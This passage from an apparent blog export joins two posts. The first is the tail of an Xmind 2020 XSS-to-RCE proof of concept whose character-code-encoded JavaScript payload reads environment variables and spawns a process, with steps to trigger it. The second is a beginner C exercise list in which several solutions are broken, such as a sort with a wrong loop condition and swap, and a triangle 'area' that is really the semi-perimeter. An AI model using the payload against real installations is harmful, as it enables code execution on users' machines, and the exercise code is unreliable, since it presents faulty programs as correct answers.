32, 102, 117, 110, 99, 116, 105, 111, 110, 40, 97, 44, 98, 41, 32, 123, 125, 59, 10, 118, 97, 114, 32, 101, 110, 118, 32, 61, 32, 112, 114, 111, 99, 101, 115, 115, 46, 101, 110, 118, 59, 10, 118, 97, 114, 32, 101, 110, 118, 95, 32, 61, 32, 91, 93, 59, 10, 102, 111, 114, 32, 40, 118, 97, 114, 32, 107, 101, 121, 32, 105, 110, 32, 101, 110, 118, 41, 32, 101, 110, 118, 95, 46, 112, 117, 115, 104, 40, 107, 101, 121, 43, 39, 61, 39, 43, 101, 110, 118, 91, 107, 101, 121, 93, 41, 59, 10, 112, 114, 111, 99, 46, 115, 112, 97, 119, 110, 40, 123, 102, 105, 108, 101, 58, 39, 99, 58, 92, 119, 105, 110, 100, 111, 119, 115, 92, 115, 121, 115, 116, 101, 109, 51, 50, 92, 99, 97, 108, 99, 46, 101, 120, 101, 39, 44, 99, 119, 100, 58, 110, 117, 108, 108, 44, 119, 105, 110, 100, 111, 119, 115, 86, 101, 114, 98, 97, 116, 105, 109, 65, 114, 103, 117, 109, 101, 110, 116, 115, 58, 102, 97, 108, 115, 101, 44, 100, 101, 116, 97, 99, 104, 101, 100, 58, 102, 97, 108, 115, 101, 44, 101, 110, 118, 80, 97, 105, 114, 115, 58, 101, 110, 118, 95, 44, 115, 116, 100, 105, 111, 58, 91, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 44, 123, 116, 121, 112, 101, 58, 39, 105, 103, 110, 111, 114, 101, 39, 125, 93, 125, 41, 59, 10, 60, 47, 115, 99, 114, 105, 112, 116, 62);\n\nconsole.log(n);\n```\n\n\n\n**2.点击大纲。在大纲模式下，选中payload，按下Ctrl+C快捷键触发该Payload，执行`calc`命令。**\n\n![执行成功](http://image.xpshuai.cn/xmind_attack_ok.png)\n\n\n\n### 修复建议\n\n该漏洞在大纲模式下触发，Xmind 2020的使用者，谨慎打开Xmind的大纲模式。\n\n\n\n\n\n### 参考\n\n[Xmind 2020 - XSS to RCE - Multiple webapps Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/49827)\n\n[漏洞情报 | Xmind 2020 XSS漏洞导致命令执行 (qq.com)](https://mp.weixin.qq.com/s/JCj4yPN5ORGt1WGc7gpuDQ)","tags":["XSS"],"categories":["渗透测试"]},{"title":"C语言做题记录(入门版)","url":"%2Fposts%2F30043%2F","content":"\n#### 1.编写一个程序求三个整数数的最大值\n\n```c\n/*\n1.编写一个程序求三个整数数的最大值\n*/\n\n#include <stdio.h>\n\n\nint main()\n{\n\tint i,j,k, max=0;\n\tprintf(\"请输入三个整数：\");\n\tscanf(\"%d %d %d\", &i, &j, &k);\n\n\tmax = (i>j?i:j)>k?(i>j?i:j):k;\n\tprintf(\"最大值为：%d\", max);\n\n\t//getchar();\n\t\n}\n```\n\n\n\n#### 2.输入10个数,并输出最大的那一个数\n\n```c\n/*\n2.输入10个数,并输出最大的那一个数\n*/\n\nvoid ten_max()\n{\n\tint arr[10], max=0;\n\tprintf(\"请输入10个整数：\\n\");\n\tfor(int i=0; i<=9; i++)\n\t{\n\t\tscanf(\"%d\", &arr[i]);\n\t}\n\n\t//处理\n\tfor(int i=0; i<=9; i++)\n\t{\n\t\tif(arr[i] > max)\n\t\t{\n\t\t\tmax = arr[i];\n\t\t}\n\t}\n\n\tprintf(\"最大值为：%d\", max);\n\n}\n\n\n\nint main()\n{\n\t//three_max();\n\tten_max();\n\n\t\n}\n\n```\n\n\n\n#### 3.判断2000-2500年中的闰年,并输出\n\n```c\n3.判断2000-2500年中的闰年,并输出\n*/\nvoid get_leap_year()\n{\n\tfor(int i=2000; i<=2500; i++)\n\t{\n\t\tif(i %400 ==0 || (i % 100 != 0 && i % 4 == 0))\n\t\t{\n\t\t\tprintf(\"%d 是闰年\\n\", i);\n\t\t}\n\t}\n}\n\n\n\nint main()\n{\n\t//three_max();\n\t//ten_max();\n\tget_leap_year();\n\n\t\n}\n\n\n```\n\n\n\n#### 4.编写一个程序求1+2+3+…+…+100的值\n\n```c++\nvoid sum_100()\n{\n\tint sum=0;\n\tfor(int i=1; i<=100; i++)\n\t{\n\t\tsum += i;\n\t}\n\tprintf(\"%d\", sum);\n\n}\n\n\nint main()\n{\n\t//three_max();\n\t//ten_max();\n\t//get_leap_year();\n\tsum_100();\n\t\n}\n\n\n```\n\n\n\n#### 5.编写一个程序求(1)-(1/2)+(1/3)……+(1/99)-(1/100)的值\n\n```c\n/*\n5.编写一个程序求(1)-(1/2)+(1/3)……+(1/99)-(1/100)的值\n*/\n\nvoid sum_100_sub()\n{\n\tfloat sign=1,sum=0, deno, tmp;\n\tfor(deno=1; deno<=100; deno++)\n\t{\n\t\ttmp = sign*(1/deno);    //分数形式\n\t\tsum = sum +  tmp;\t\t\t//加和，全面存储\n\t\tsign = (-1)*sign;  //换号\n\t}\n\tprintf(\"%f \\n\", sum);\n}\n\n\nint main()\n{\n\t//three_max();\n\t//ten_max();\n\t//get_leap_year();\n\t//sum_100();\n\tsum_100_sub();\n}\n```\n\n\n\n\n\n#### 6.判断一个数能否同时被3和5整除\n\n```c\n/*\n6.判断一个数能否同时被3和5整除\n*/\nvoid division_3_5()\n{\n\tint num;\n\tprintf(\"输入一个整数：\");\n\tscanf(\"%d\", &num);\n\tif (num % 3 == 0 && num % 5 == 0)\n\t{\n\t\tprintf(\"能同时被5和3整除\");\n\t\t\n\t}\n\telse\n\t{\n\t\tprintf(\"不能\");\n\t}\n}\n\n\n\n\nint main()\n{\n\t//three_max();\n\t//ten_max();\n\t//get_leap_year();\n\t//sum_100();\n\t//sum_100_sub();\n\tdivision_3_5();\n\t\n}\n```\n\n\n\n\n\n#### 7.将具有n个元素的数组a中数按照从小到大排序并从大到小输出\n\n```c\n7.将具有n个元素的数组a中数按照从小到大排序并从大到小输出\n*/\n\nvoid sort_arr()\n{\n\tint sum=0, num, a[100], n, tmp;\n\n\tprintf(\"输入n:\");\n\tscanf(\"%d\", &n);\n\tfor(int i=0; i< n; i++)\n\t{\n\t\tscanf(\"%d\", &a[i]);\n\t}\n\n\tprintf(\"元素为; \");\n\tfor(int i=0; i< n; i++)\n\t{\n\t\tprintf(\"%d\", a[i]);\n\t}\n\n\t//排序\n\tfor(int i=0; i<n; i++)\n\t{\n\t\tfor(int j=i+1; i<n; j++)  // a[j]代表a[i+1]\n\t\t{\n\t\t\tif(a[i] > a[j])\n\t\t\t{\n\t\t\t\ttmp = a[i];\n\t\t\t\ttmp = a[j];\n\t\t\t\ta[j] = a[i];  //交换a[i]和a[i+1]\n\t\t\t}\n\t\t}\n\t\t//\n\t\n\t}\n\n\n\t//输出\n\tprintf(\"从小到大元素为; \");\n\n\tfor(int i=n-1; i >= 0; i--)\n\t{\n\t\tprintf(\"%d\", a[i]);\n\t}\n\n\n}\n\n\n\n```\n\n\n\n#### 8.编写一个程序将大写字母转换成小写字母\n\n```c\n/*\n8.编写一个程序将大写字母转换成小写字母\n*/\nvoid big_to_small()\n{\n\tchar c1, c2;\n\tscanf(\"%c\", &c1);\n\tc2 = c1 + 'a'-'A';\n\tprintf(\"%c \\n\", c2);\n}\n\n\nint main()\n{\n\tbig_to_small();\n}\n\n```\n\n\n\n\n\n#### 9.编写一个程序将小写字母转换成大写字母\n\n```c\n/*\n9.编写一个程序将小写字母转换成大写字母\n*/\nvoid small_to_big()\n{\n\tchar c1, c2;\n\tscanf(\"%c\", &c1);\n\tc2 = c1 + 'A'-'a';\n\tprintf(\"%c \\n\", c2);\n}\n\n\n\n\nint main()\n{\n\tsmall_to_big();\n}\n\n```\n\n\n\n#### 10.输入字符,最终按小写输出\n\n```c\n/*\n10.输入字符,最终按小写输出\n*/\nvoid all_to_small()\n{\n\tchar ch;\n\tprintf(\"输入字符：\");\n\tscanf(\"%c\", &ch);\n\tch = (ch >='A' && ch <= 'Z')?(ch + 'a'-'A'):ch;\n\tprintf(\"输出: %c\\n\", ch);\n}\n\n\nint main()\n{\n\tall_to_small();\n}\n\n\n```\n\n\n\n\n\n#### 11.给出三角形边长a、b、c计算出面积\n\n```c\nvoid tri_11()\n{\n\tdouble a=2,b=2,c=3,p,s;\n  \n    if(a+b>c && a+c>b && b+c>a) //判断是否可以构成三角形。\n    {\n        p=(a+b+c)/2;//计算半周长\n        s=sqrt(p*(p-a)*(p-b)*(p-c));//套用海伦公式，计算面积\n        printf(\"面积为%lf\\n\", s);//输出结果\n    }\n    else printf(\"无法构成三角形\\n\");\n\n}\n\n```\n\n\n\n#### 12.给出三角形三个点坐标计算出面积\n\n```c\nvoid tri_12()\n{\n\tPoint p1, p2, p3;\n\tdouble a,b,c, area;\n\tp1.x = 1;\n\tp1.y = 2;\n\tp2.x = 1;\n\tp2.y = 3;\n\tp3.x = 2;\n\tp3.y = 2;\n\n\ta = sqrt((p1.x-p2.x)*(p1.x-p2.x) + (p1.y-p2.y)*(p1.y-p2.y));\n\tb = sqrt((p2.x-p3.x)*(p2.x-p3.x) + (p2.y-p3.y)*(p2.y-p3.y));\n\tc = sqrt((p1.x-p3.x)*(p1.x-p3.x) + (p1.y-p3.y)*(p1.y-p3.y));\n\n\tarea = (a+b+c)/2;\n\tprintf(\"%lf\", area);\n}\n```\n\n\n\n#### 13.请编程序将”China”译成密码\n\n密码规律是:用原来的字母后面第4个字母代替原来的字母。例如:字母“A”后面第4个字母是“E”，用“E”代替”A”。因此，”China”应译为”Glmre”。请编一程序，用赋初值的方法使c1,c2,c3, c4,c5这5个变量的值分别为’C'，'h’,'，‘n', ‘a’，经过运算，使c1, c2, c3, c4, c5分别为’G’，‘I,‘m’,‘r'，‘e’。分别用putchar函数和 printf 函数输出这个5个字符\n\n```c\nvoid china_pass()\n{\n\tchar c1='C',c2='h',c3='i',c4='n',c5='a';\n\tc1+=4;\n    c2+=4;\n    c3+=4;\n    c4+=4;\n    c5+=4;\n\n\tprintf(\"%c%c%c%c%c\",c1,c2,c3,c4,c5);\n\n}\n```\n\n\n\n#### 14.给出一个百分制成绩，要求输出成绩等级A,B,C,D,E。90分以上为A，80~90分为B,70~79分为C,60~69分为D,60分以下为E。\n\n```c\n//14.给出一个百分制成绩，要求输出成绩等级A,B,C,D,E。90分以上为A，80~90分为B,70~79分为C,60~69分为D,60分以下为E。\nvoid grade_bank()\n{\n\tint grade;\n\tprintf(\"请输入成绩(0-100): \");\n\tscanf(\"%d\", &grade);\n\n\tswitch (grade/10)\n\t{\n\tcase 10:\n\tcase 9:\n\t\tprintf(\"A\");\n\t\tbreak;\n\tcase 8:\n\t\tprintf(\"B\");\n\t\tbreak;\n\tcase 7:\n\t\tprintf(\"C\");\n\t\tbreak;\n\tcase 6:\n\t\tprintf(\"D\");\n\t\tbreak;\n\tdefault:\n\t\tprintf(\"E\");\n\t\tbreak;\n\t}\n\t\n\n}\n```\n\n\n\n#### 15.输出2的N次幂:1,2,4,8,.一直到2^N\n\n注:要求不使用库函数\n\n```c\n#define N 16\n\n//15.输出2的N次幂:1,2,4,8,一直到2^N   注:要求不使用库函数\nvoid get_2_pow()\n{\n\tint num=1;\n\tfor(int i=0; i<=N; i++)  // i记录当前指数\n\t{\n\t\t\n\t\tprintf(\"2 的%d次方是: %d \\n\", i, num);\n\t\tnum *=2;\t\n\t}\n}\n\n\n\n\n\n```\n\n\n\n\n\n\n\n#### 16.判断一个数是否为素数\n\n```c\nint m;  // 输入的整数 \nint i;  // 循环次数\nint k;  // m 的平方根 \n\nprintf(\"输入一个整数：\");\nscanf(\"%d\",&m);\n\n// 求平方根，注意sqrt()的参数为 double 类型，这里要强制转换m的类型 \nk=(int)sqrt( (double)m );\nfor(i=2;i<=k;i++)\n    if(m%i==0)\n        break;\n\n// 如果完成所有循环，那么m为素数\n// 注意最后一次循环，会执行i++，此时 i=k+1，所以有i>k \nif(i>k)\n    printf(\"%d是素数。\\n\",m);\nelse\n    printf(\"%d不是素数。\\n\",m);\nreturn 0;\n```\n\n\n\n\n\n#### 17.输出2-300间的素数\n\n```c\n#include <stdio.h>\n#include <math.h>\n\n//17.输出2-300间的素数\nint main()\n{\n\tint num, i, count=0, k;\n\t\n\tfor(num=2; num<=300; num++)\n\t{\n\t    k = (int)sqrt((double)num);\n\t\t\n\t\tfor(i=2; i<=k; i++)\n\t\t{\n\t\t\tif(num%i == 0)\n\t\t\t    break;\n\t\t}\n\n\t   if(i>k)\n\t       printf(\"%d是素数。\\n\",num);\n       else\n           printf(\"%d不是素数。\\n\",num);\n\n\t\n\t}\n\treturn 0;\n\n}\n\n```\n\n\n\n\n\n#### 18.求2+22+222+2222+……，共5项\n\n```c\n//18.求2+22+222+2222+……，共5项\nvoid cal_222()\n{\n\tint n = 2, sum=0;\n\tfor(int i=0; i<=5; i++)\n\t{\n\t\tn = n*10 + 2;\n\t\tsum += n;\n\t\t\n\t}\n\t\n\tprintf(\"%d \\n\", sum);\n}\n\n\n```\n\n\n\n\n\n#### 19．编程求`1!+2!+3!+4!...n!`的值,n小于等于10\n\n```c\n//19.编程求`1!+2!+3!+4!...n!`的值,n小于等于10\n\nvoid get_sum1()\n{\n\tint sum=0, k, m=1;\n\tprintf(\"请输入n:\");\n\tscanf(\"%d\", &k);\n\tfor(int i=1; i<=10; i++)\n\t{\n\t\tfor(int j=1; j<=i; j++)   //循环到指定值\n\t\t{\n\t\t\tm = m * j;  //阶乘的结构\n\t\t}\n\t\tsum += m;\n\t\tm = 1;\n\t}\n\tprintf(\"到%d的阶乘之和为: %d\", k, sum);\n}\n\n```\n\n\n\n\n\n\n\n#### 20．自然底数e=2.718281828…，现编程求e\n\ne 的计算公式为:e=1+1/1!+1/2!+1/3!+...\n\n求当最后一项的值小于10^(-10)时结束\n\n```c\nvoid get_e()\n{\n\tfloat e =1.0, n=1.0;\n\tint i=1;\n\n\twhile (1/n > 1e-10)\n\t{\n\t\te += 1/n;\n\t\ti++;\n\t\tn = i*n;\n\n\t}\n\n\tprintf(\"e的值为：%f\\n\", e);\n\n}\n```\n\n\n\n\n\n#### 21.求1000以内的所有回文素数。\n\n任意的**整数**，当从左向右读与从右向左读是相同的，且为素数时,称为回文素数。\n\n```c\nint sushu(int i)\n{\n    int j;\n    if(i<=1)\n        return 0;\n    if(i==2)\n        return 1;\n    for(j=2;j<i;j++)\n    {\n        if(i%j==0)\n            return 0;\n        else if(i != j+1)\n            continue;\n        else\n            return 1;\n    }\n}\n\nvoid test()\n{\n\tint i;\n    for(i=10;i<1000;i++)\n\t{\n\tif(sushu(i)==1)\n\t{\n\t\tif(i/100==0) //如果是两位数\n\t\t{\n\t\t\tif(i/10==i%10)\n\t\t\t\tprintf(\"%5d\",i);\n\t\t\tif(i%5==0)\n\t\t\t\tprintf(\"\\n\");\n\t\t}\n\t\telse  //如果是三位数\n\t\t\tif(i/100==i%10)\n\t\t\t\tprintf(\"%5d\",i);\n\t\t\tif(i%5==0)\n\t\t\t\tprintf(\"\\n\");\n\t\n\t}\n\t\n\t\n\t}\n}\n\n```\n\n\n\n#### 22．在数组中插入元素\n\n有一个已经排好序的数组。输一个数，要求按原来的规律将它插入数组中。\n\n```c\n//22.在数组中插入元素\nvoid insert_arr(int *arr, int len, int index, int val)\n{\n\tfor(int j=len-1; j>= index-1; j--)\n\t{\n\t\tarr[j+1] = arr[j];\n\t}\n\tarr[index-1] = val;\n\n}\n\n\n\n\nint main()\n{\n\tint a[5] = {1, 22, 3, 7, 9};\n\tfor(int i=0; i<5; i++)\n\t{\n\t\tprintf(\"%d, \", a[i]);\n\t\n\t}\n\n\tinsert_arr(a, 5, 2, 99);  //在2的位置插入99\n\n\tfor(int i=0; i<6; i++)\n\t{\n\t\tprintf(\"%d, \", a[i]);\n\t\n\t}\n\n\n}\n```\n\n\n\n\n\n#### 23．求序列:2/1，3/2，5/3，8/5，13/8，21/13...的前20项之和。\n\n```c\n//23.求序列:2/1，3/2，5/3，8/5，13/8，21/13...的前20项之和。\nvoid sum_20()\n{\n\tdouble x=2, y=1, tmp;\n\tdouble sum=0;\n\n\tfor(int i=0; i<20; i++)\n\t{\n\t\tsum += x / y;\n\n\t\ttmp = y;\n\t\ty = x;\n\t\tx = tmp + x;\n\n\t}\n\t\n\tprintf(\"%f\\n\", sum);\n\n}\n\n```\n\n\n\n\n\n#### 24．使用二维数组将一个3×4的矩阵中所有元素的最大值及其下标获取\n\n```c\n#include <stdio.h>\n\nint main()\n{\n    \n\tint arr[3][4] = {{1,2,3,4},{5,6,7,8},{9,55,3,11}};\n\tint max_val = arr[0][0], max_i, max_j;\n\n\tfor(int i=0; i<3; i++)\n\t{\n\t\tfor(int j=0; j<4; j++)\n\t\t{\n\t\t\tif (arr[i][j] > max_val)\n\t\t\t{\n\t\t\t\tmax_val = arr[i][j];\n\t\t\t\tmax_i = i;\n\t\t\t\tmax_j = j;\n\t\t\t}\n\t\t\n\t\t\n\t\t}\n\n\t\n\t}\n\n\tprintf(\"最大值为:%d, 下标为:%d,%d\\n\", max_val, max_i, max_j);\n\n\n\t\n\treturn 0;\n\n}\n```\n\n\n\n\n\n#### 25．编写程序实现矩阵转置\n\n转置是指:将一个矩阵的行与列调换\n\n```c\n//25．编写程序实现矩阵转置\nvoid revert_arr()\n{\n\tint a[3][4] = {{1,2,3,4},{5,6,7,8},{9,55,3,11}};\n\tint b[4][3];\n\n\n\n\tfor(int i=0;i<3;i++) \n\t{\n\t\tfor(int j=0;j<4;j++) \n\t\t{\n\t\t\t b[j][i]=a[i][j];  //转置\n\t\t}\n\t}\n\n\t//输出\n\tfor(int i=0;i<4;i++) \n    { \n        for(int j=0;j<3;j++) \n\t\t{\n\t\t\tprintf(\"%d  \",b[i][j]); \n            //printf(\"\\n\"); \n\t\t\n\t\t}\n    } \n\n\n\n}\n\n```\n\n\n\n\n\n#### 26．求3乘3矩阵对角线元素之和\n\n3乘3矩阵对角线有两条，对于二维数组对角线上数组元素下标满足`i==j || i+j==2`\n\n```c\nvoid get_medi_sum()\n{\n\tint a[3][3] = {{1,2,3},{5,6,7},{9,55,3}};\n\tint sum=0;\n\n\tfor(int i=0;i<3;i++) \n\t{\n\t\tfor(int j=0;j<4;j++) \n\t\t{\n\t\t\t if(i==j || i+j==2)\n\t\t\t {\n\t\t\t\tsum += a[i][j];\n\t\t\t \n\t\t\t }\n\t\t}\n\t}\n\n\tprintf(\"%d\", sum);\n\n\n\n}\n\n```\n\n\n\n#### 27.求水仙花数\n\n阿姆斯特朗数也就是俗称的水仙花数、是指一个三位数，其各位数字的立方和等于该致本身。例如:153=1^3+5^3+3^3，所以153就是一个水仙花数。求出所有的水仙花数。\n\n```c\nvoid shuixianhua()\n{\n\tint ge, bai, shi;\n\tfor(int i=100; i<=999; i++)\n\t{\n\t\tge = i % 10;\n\t\tbai = i/100;\n\t\tshi = i%100 / 10;\n\t\tif((ge*ge*ge + shi*shi*shi + bai*bai*bai) == i)\n\t\t{\n\t\t\tprintf(\"%d \", i);\n\t\t\n\t\t}\n\t\n\t}\n\n\n}\n```\n\n\n\n\n\n#### 28.求出前20个Fibonacci数列\n\n斐波那契数列从0和1开始，之后的每一项就由其前面两数相加得到。在数学上，斐波纳契数列以如下递归的方法定义:`F(0)=0`，`F(1)=1`，`Fn=F[n-1)+F(n-2)(n>=2，n属于N*)`，求出前20个 Fibonacci数列\n\n```c\nint fibonacci(int i)\n{\n\tif(i==0)\n\t{\n\t\treturn 0;\n\t}\n\telse if(i==1)\n\t{\n\t\treturn 1;\n\t}\n\telse\n\t{\n\t\treturn fibonacci(i-1) + fibonacci(i-2);\n\t}\n\n}\n\nint main()\n{\n\t\tfor(int i=1;i<=20;i++)\n\t\t{\n\t\t\tprintf(\"%d \\t\", fibonacci(i));\n\t\t}\n\n}\n```\n\n\n\n或者:\n\n```c\nvoid fabs()\n{\n\n\tint arr[20] = {1, 1};\n\n\tfor(int i=2; i<20; i++)\n\t{\n\t\tarr[i] = arr[i-1] + arr[i-2];\n\t\n\t}\n\n\t//输出\n\tfor(int j=0; j<20; j++)\n\t{\n\t\tprintf(\"%d\\t\", arr[j]);\n\n\t\t//控制格式\n\t\tif(j % 5 == 0) printf(\"\\n\");\n\n\t}\n\n}\n```\n\n\n\n#### 29.生兔子问题\n\n假设一对兔子的成熟期是一个月，即一个月可长成成兔，那么，如果`每对`成兔`每个月`都`生一对小兔`,一对新生的小兔`从第二个月起`就开始生兔子，试问从一对兔子开始繁殖，以后每个月会有多少对免\n子?\n\n```c\n//循环方式实现兔子生小兔子问题\nvoid rabbit_fabs()\n{\n\tint month, tu1=1,tu2=1, tu3;\n\tprintf(\"请输入第几个月数:\\n\");\n\tscanf(\"%d\",&month);\n\n\tif(month ==1 || month == 2)\n\t{\n        printf(\"有一对兔子\");\n\n\t}\n\telse if(month > 2)\n\t{\n\t\tfor(int i=3; i<=month; i++)\n\t\t{\n\t\t\ttu3 = tu2 + tu1;\n\t\t\ttu1 = tu2;\n\t\t\ttu2 = tu3;\n\t\t}\n\t\tprintf(\"%d 月的兔子数为：%d\\n\",month,tu3);\n\n\n\t}\n\n}\n\n\n\n//递归方式：\nint rabbit_fabs_digui_test(int m)\n{\n\tif(m ==1 || m == 2)\n\t\treturn 1;\n\telse\n\t{\n\t\treturn rabbit_fabs_digui_test(m-1) + rabbit_fabs_digui_test(m-2);\n\t}\n\n}\n\n\n//递归方式实现兔子生小兔子问题\nvoid rabbit_fabs_digui()\n{\n\n\n\tint month;\n\tprintf(\"请输入第几个月数:\\n\");\n\tscanf(\"%d\",&month);\n\tprintf(\"%d 月的兔子数为：%d\\n\",month,rabbit_fabs_digui_test(month));\n\n}\n\n```\n\n\n\n\n\n#### 30.输入一行英文句子，统计单词数\n\n```c\n//其实就是统计空格数字(单词数=空格数+1)\n\nvoid count_word()\n{\n\tint word=0,count=0;\n\tchar ch;\n\n\t//输入\n\twhile ((ch=getchar()) != '\\n')\n\t{\n\t\tif(ch == ' ')\n\t\t{\n\t\t\tword = 0; //如果遇到空格就置word为0\n\t\t}\n\t\telse if(word==0)\n\t\t{\n\t\t\tword = 1;\n\t\t\tcount ++;\n\t\t}\n\n\t}\n\n\tprintf(\"单词数为: %d \\n\", count);\n}\n\n```\n\n\n\n\n\n#### 31.加密解密\n\n在对一个指定的字符串加密之后，利用解密函数能够对密文解密，显示明文信息。\n\n加密的方式是将字符串中每个字符加上它在字符串中的位置和一个偏移值5。\n\n以字符串“mrsoft”为例，第一个字符“m”在字符串中的位置为0，那么它对应的密文是“'m'+0+5\",即r.\n\n```c\n#include <string.h>\n\nvoid encrypt1()\n{\n\tint flag = 1, str_len=0, i, j;\n\tchar text[128] = {'\\0'}, encrypt_text[128]={'\\0'}; //明文字符串、密文字符串\n\t\n\twhile (true)\n\t{\n\t\tif(flag == 1) //1加密\n\t\t{\n\t\t\tprintf(\"输入原字符串: \");\n\t\t\tscanf(\"%s\", &text);\n\t\t\tstr_len = strlen(text);\n\t\t\tfor(i=0; i<str_len; i++)\n\t\t\t{\n\t\t\t\tencrypt_text[i] = text[i] + i + 5;\n\t\t\t}\n\t\t\tencrypt_text[i]='\\0';\n\t\t\tprintf(\"加密后的字符串：%s\\n\", encrypt_text);\n\n\t\t}\n\n\t\telse if(flag ==2) //解密\n\t\t{\n\t\t\tstr_len = strlen(encrypt_text);\n\t\t\tfor(i=0; i<str_len; i++)\n\t\t\t{\n\t\t\t\ttext[i] = encrypt_text[i] - i - 5;\n\t\t\t\n\t\t\t}\n\t\t\ttext[i]='\\0';\n\t\t\tprintf(\"字符串：%s\", text);\n\t\t}\n\n\t\tprintf(\"请输入要选择的功能(1加密，2解密)：\");\n\t\tscanf(\"%d\", &flag);\n\t}\n\n\n\n\n}\n\n\n```\n\n\n\n\n\n#### 32.逆序输出该整数\n\n将一个从键盘输入的整数存放到一个数组中，通过程序的运行按照数组中的顺序输出该整数,要求使用递归的方法解决问题\n\n```c\n//递归思想\n\n#include <stdio.h>\n\nint convert(char s[],int n)\n{\n    int i;\n    // 如: 4567\n    if((i=n/10)!=0)\n        convert(s+1,i);\n\n    *s=n%10+'0';\n\n    return 0;\n\n}\n\nint main()\n{\n\n    int num;\n\n    char str[10]=\" \";\n\n    printf(\"input integer data：\");\n\n    scanf(\"%d\",&num);\n\n    convert(str,num);\n\n    printf(\"output string：\\n\");\n\n    puts(str);\n\n    return 0;\n\n}\n```\n\n\n\n\n\n#### 33.将一个一维数组就地逆置\n\n(就地逆置指不再开辟第二个数组空间)\n\n```c\n//数组两端对称元素相互交换\n//33.将一个一维数组就地逆置\nvoid reverse_arr_there()\n{\n\t//可以这么来求数组长度：    int cnt = sizeof(a) / sizeof(a[0]);\n\n\tint arr[10]= {1,2,3,4,5,6,7,8,9,10};\n\tint i=0, j = 9, tmp;\n\twhile (i<=j)\n\t{\n\t\ttmp = arr[i];\n\t\tarr[i] = arr[j];\n\t\tarr[j] = tmp;\n\t\ti++;\n\t\tj--;\n\t}\n    \n\tfor (i = 0; i < 10; i++)\n\t{\n\t\tprintf(\"%d\\t\", arr[i]);\n\t}\n}\n\n\n\n```\n\n\n\n\n\n#### 34.数据加密\n\n某个公司采用公用电话传递数据,数据是四位的整数，在传递过程中是加密的,**加密规则**如下:每\n位数字都加上5,然后用和除以10的余数代替该数字，再将第一位和第四位交换,第二位和第三位交换。\n\n```c\n//每位数字都加上5,然后用和除以10的余数代替该数字，再将第一位和第四位交换,第二位和第三位交换。\nvoid crypt_tel()\n{\n\tint num, a[4], tmp;\n\tscanf(\"%d\", &num);\n\n\t//个位 1 2 3 4\n\ta[0] = num % 10;\n\t//十位\n\ta[1] = num %100 / 10;\n\t//百位\n\ta[2] = num %1000 / 100;\n\t//千位\n\ta[3] = num / 1000;\n\n\t//加密\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\ta[i] = a[i] + 5;\n\t\ta[i] = a[i]%10;\n\t}\n    //交换\n\tfor (int i = 0; i < 3/2; i++)\n\t{\n\t\ttmp = a[i];\n\t\ta[i] = a[3-i];\n\t\ta[3-i] = a[i];\n\n\t}\n\n\t//输出\n\tfor (int i = 0; i < 4; i++)\n\t{\n\t\tprintf(\"%d\", a[i]);\n\n\t}\n\n}\n\n```\n\n\n\n\n\n#### 35.输出菱形\n\n```c\n/*\n设菱形的总行数为line，总列数为column，当前行为i，当前列为j。上半部分与下半部分的规律不一样，应该分开讨论。\n\n我们着眼于星号(*)，思考什么条件下输出星号，总结出如下的规律。\n\n1) 对于上半部分(包括中间一行)，当前行与当前列满足如下关系输出星号：\nj>=(column+1)/2-(i-1)     (column+1)/2-(i-1)为第i行最左边的星号\nj<=(column+1)/2+(i-1)    (column+1)/2+(i-1)为第i行最右边的星号\n\n2) 对于下半部分，当前行与当前列满足如下关系输出星号：\nj>=(column+1)/2-(line-i)     (column+1)/2-(line-i)为第i行最左边的星号\nj<=(column+1)/2+(line-i)    (column+1)/2+(line-i)为第i行最右边的星号\n\n不满足上述条件，则输出空格。\n*/\n\nvoid print_diamond()\n{\n\tint line;  // 菱形总行数\n    int column;  // 菱形总列数\n    int i;  // 当前行\n    int j;  // 当前列\n\n\tprintf(\"请输入菱形的行数(奇数)：\");\n    scanf(\"%d\", &line);\n    if(line%2==0){  // 判断是否是奇数\n        printf(\"必须输入奇数！\\n\");\n        exit(1);\n    }\n    column = line;  // 总行数和总列数相同\n\n\tfor(i=1; i<=line; i++){  // 遍历所有行\n\n\t\tif(i<(line+1)/2+1){  // 上半部分（包括中间一行）\n\t\t\tfor(j=1; j<=column; j++){  // 遍历上半部分的所有列\n\t\t\t\tif( (column+1)/2-(i-1)<=j && j<=(column+1)/2+(i-1) ){\n\t\t\t\t\tprintf(\"*\");\n\t\t\t\t}else{\n\t\t\t\t\tprintf(\" \");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\n\t\telse{  // 下半部分\n\t\t\tfor(j=1; j<=column; j++){  // 遍历下半部分的所有列\n\t\t\t\tif( (column+1)/2-(line-i)<=j && j<=(column+1)/2+(line-i) ){\n\t\t\t\t\tprintf(\"*\");\n\t\t\t\t}else{\n\t\t\t\t\tprintf(\" \");\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\tprintf(\"\\n\");\n}\n}\n```\n\n\n\n\n\n#### 36.求2-300范围内完数的个数。\n\n(如果**一个数等于它的因子之和**，则称该数为“完数”(或“完全数”)。例如，6**的因子为**1、23,而6=1+2+3，因此6是“完数”）\n\n```c\n//36.2-300范围内完数的个数\nvoid perfect_num()\n{\n\tint i,j,sum;\n\tfor (i = 2; i <= 300; i++) //外层控制取值范围\n\t{\n\t\tsum = 0;\n\t\tfor (j = 1; j < i; j++)  //判断因子\n\t\t{\n\t\t\tif(i%j == 0) //能被整余，则为其中一个因子\n\t\t\t{\n\t\t\t\tsum += j;\n\t\t\t}\n\n\t\t}\n\n\t\t//判断因子之和与当前原数是否相同\n\t\tif(sum == i)\n\t\t{\n\t\t\tprintf(\"%d是完数\\n\", i);\n\t\t}\n\t\t//else\n\t\t//{\n\t\t//\tprintf(\"%d不是完数\\n\", i);\n\t\t//}\n\n\t}\n\n}\n\n\n```\n\n\n\n#### 37.求孪生素数\n\n所谓李生素数指的是间隔为2的两个相邻素数，因为它们之间的距离已经近的不能再近了,如同李生兄弟一样,所以将这一对素数称为孪生素数。编程求出3~1000以内的所有孪生套数。\n\n```c\n//即i是素数，i+2(相邻的)也是素数\n\n\n//37.求孪生素数\nint twin_prime(int n)\n{\n\tlong m;\n\tm = sqrt((double)n);\n\tfor(int i=2; i<=m; i++)\n\t{\n\t\tif(n%i == 0)  //能被除尽，不是素数\n\t\t{\n\t\t\treturn 0;\n\t\t}\n\t}\n\treturn 1;  //是素数\n}\n\nvoid 